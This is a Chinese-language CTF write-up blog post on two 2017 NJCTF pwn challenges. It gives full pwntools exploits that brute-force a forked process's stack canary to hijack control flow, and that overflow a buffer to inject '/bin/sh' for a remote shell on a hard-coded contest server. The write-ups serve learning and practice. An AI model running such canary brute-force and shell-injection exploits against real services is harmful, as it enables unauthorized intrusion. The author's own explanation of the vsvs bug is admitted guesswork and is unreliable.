---
title: 2017NJCTF PWN
tags:
  - PWN
categories: []
date: 2017-03-14 22:04:51
---

## messager

`fork`，出来的进程基本上和原进程完全一样，包括`canary`和`ebp`。爆破`canary`，得到值后跳转到`0x400BC6`。因为程序已经将`flag`加载到内存中了，这里的代码将内存中的`flag`发过来。

**说几个因为太菜的坑吧。。**

1. `pwntools`的`sendline`会在最后添加上`\x0a`，而`send`会直接把数据发过去，我一度以为`\x0a`是发送结尾的标配以至于不能爆破。。
2. 关于linux的僵尸进程，`kill`是杀不掉的。。`kill -9 PID`可以杀掉，`killall name`可以杀掉包括进程簇，`pstree`或者`ps auxt`可以查看进程树。`defeunc`进程如果没有父进程的话。。**重启吧Orz**

### exp

```
from pwn import *
import os, sys

DEBUG = 0

elf = ELF('./messager')

if DEBUG:
    context(log_level='debug')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def do_canary():
    canary = '\x00'
    off = 'a' * 104
    while (len(canary)) != 8:
        for i in range(256):
            p = remote('127.0.0.1', 5555)
            p.recvuntil('Welcome!\n')
            t = chr(i)
            try:
                print 'sending....', i
                p.send(off + canary + t)
                line = p.recvline()
                if 'Message' in line:
                    p.close()
                    canary += t
                    break
            except Exception, e:
                print e
                p.close()
                continue
    return canary

if __name__ == '__main__':
    canary = do_canary()
    p = remote('127.0.0.1', 5555)
    p.recvuntil('Welcome!')
    payload = 'a' * 104 + canary + p64(0) + p64(0x400BC6)
    p.send(payload)
    print p.recvall()
    p.close()

```

## vsvs

程序应该是调用的`system("echo input")`，这样的函数，也就是说如果想办法让程序执行`system("/bin/sh)`那么就可以得到`shell`了。然而到现在我都还没搞懂这个程序的运行原理，存在`read`的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的`input`里的值了么

流程
```
ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017njctf/pwn/vsvs$ nc 218.2.197.235 23749 
VSVS: Very Secure VPN Server
Please input access code:
22
Command: echo <input>
input:
aaa
What's your name?bbb
aaa
```

在`What's your name?`后存在栈溢出，猜测是超出缓冲区长度，覆盖了`input`中存在检查的值了

exp:
```
from pwn import *

'''
for i in range(10000000):
    try:
        p = remote('218.2.197.235', 23749)
        p.recvuntil('code:\n')
        print 'sendling.... ', i
        p.sendline(str(i))
        a = p.recvline()
        if 'Wrong' in a:
            p.close()
            continue
        else:
            print 'code is => ', i
            break
    except Exception, e:
        continue
'''

p = remote('218.2.197.235', 23749)
exp = 'a' * 1024 + '/bin/sh'
p.sendlineafter('code:\n', '22')
p.sendlineafter('input:\n', '1')
p.sendlineafter('?', exp)
p.interactive()
```